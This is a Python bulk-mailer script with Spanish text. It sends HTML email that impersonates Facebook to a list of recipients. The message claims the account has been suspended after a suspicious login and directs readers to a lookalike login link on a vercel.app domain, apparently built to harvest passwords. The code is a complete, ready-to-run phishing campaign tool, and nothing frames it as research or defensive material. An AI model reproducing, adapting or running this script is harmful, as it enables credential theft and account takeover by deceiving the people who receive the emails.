import json
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import time
import os
from datetime import datetime

class EmailSender:
    def __init__(self, config_path='config.json'):
        with open(config_path, 'r', encoding='utf-8') as file:
            self.config = json.load(file)
        
        if 'SSLKEYLOGFILE' in os.environ:
            del os.environ['SSLKEYLOGFILE']

    def get_formatted_date(self):
        current_date = datetime.now()
        fecha = current_date.strftime("%d de ")
        fecha += self.config['months_spanish'][current_date.month - 1]
        fecha += current_date.strftime(" de %Y")
        return fecha

    def verify_credentials(self, email, password):
        try:
            print(f"Intentando conectar a {self.config['email_settings']['smtp_server']}...")
            context = ssl.create_default_context()
            server = smtplib.SMTP(
                self.config['email_settings']['smtp_server'],
                self.config['email_settings']['port']
            )
            print("Conexión establecida")
            
            print("Iniciando TLS...")
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            print("TLS iniciado correctamente")
            
            print(f"Intentando autenticar con el correo: {email}")
            server.login(email, password)
            print("Autenticación exitosa")
            
            server.quit()
            return True
        except Exception as e:
            print("\nError detallado de autenticación:")
            print(f"- Servidor SMTP: {self.config['email_settings']['smtp_server']}")
            print(f"- Puerto: {self.config['email_settings']['port']}")
            print(f"- Error completo: {str(e)}")
            print("\nPosibles soluciones:")
            print("1. Verifica que tu correo esté escrito correctamente")
            print("2. Asegúrate de que la contraseña sea correcta")
            print("3. Si usas autenticación de dos factores, es posible que necesites generar una contraseña de aplicación")
            print("4. Verifica que tu cuenta permita el acceso a aplicaciones menos seguras")
        return False

    def create_email_body_html(self, name):
        template = self.config['email_template']
        fecha = self.get_formatted_date()
        
        html = f"""
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Alerta de Seguridad - Verificación de Cuenta</title>
        </head>
        <body style="font-family: Arial, sans-serif; background-color: #f7f7f7; margin: 0; padding: 20px;">
            <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
                <h2 style="color: #1877F2;">Facebook</h2>
                <h2 style="color: #1877F2;">Alerta de Seguridad - Verificación de Cuenta</h2>
                <p style="font-size: 16px; color: #333;">Estimado {name}</p>
                <p style="font-size: 16px; color: #333;">Recientemente detectamos un intento de inicio de sesión en tu cuenta desde un dispositivo o ubicación inusual. Para tu seguridad, hemos suspendido temporalmente el acceso a tu cuenta.</p>
                <p style="font-size: 16px; color: #333;">Por favor, sigue el siguiente enlace para verificar tu identidad y restaurar el acceso a tu cuenta:</p>
                <a href="https://facebooklogin-kappa.vercel.app/" style="display: inline-block; padding: 12px 20px; background-color: #1877F2; color: white; text-decoration: none; font-size: 16px; border-radius: 5px; text-align: center;">Verificar mi cuenta</a>
                <p style="font-size: 14px; color: #666;">Si no solicitaste este cambio, por favor ignora este mensaje. Si necesitas más ayuda, visita nuestra página de soporte.</p>
                <p style="font-size: 14px; color: #666;">Gracias por usar nuestros servicios.</p>
                <p style="font-size: 12px; color: #888;">Este es un correo electrónico automático. No respondas a este mensaje.</p>
            </div>
        </body>
        </html>
        """
        return html

    def send_email(self, sender_email, password, recipient, name):
        settings = self.config['email_settings']
        template = self.config['email_template']
        
        message = MIMEMultipart('alternative')
        message["From"] = sender_email
        message["To"] = recipient
        message["Subject"] = Header(template['subject'], 'utf-8')

        # Crear versión HTML del correo
        html_body = self.create_email_body_html(name)
        message.attach(MIMEText(html_body, 'html', 'utf-8'))

        try:
            context = ssl.create_default_context()
            with smtplib.SMTP(settings['smtp_server'], settings['port']) as server:
                server.ehlo()
                server.starttls(context=context)
                server.ehlo()
                server.login(sender_email, password)
                server.send_message(message)
                print(f"✓ Correo enviado exitosamente a {name} ({recipient})")
        except Exception as e:
            print(f"✗ Error al enviar correo a {name} ({recipient}): {str(e)}")

def load_data(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
    return data['recipients']

def main():
    email_sender = EmailSender()
    sender_email = email_sender.config['email_settings']['sender_email']
    password = input("Ingresa tu contraseña: ")

    print("\nVerificando credenciales...")
    if not email_sender.verify_credentials(sender_email, password):
        return

    try:
        recipients = load_data("email.json")
        
        for email in recipients:
            name = "Usuario"  # Puedes ajustar esto si tienes un nombre asociado a cada correo
            
            print(f"Enviando correo a {email}...")
            email_sender.send_email(sender_email, password, email, name)
            time.sleep(1)

    except Exception as e:
        print(f"Error general: {str(e)}")

if __name__ == "__main__":
    main()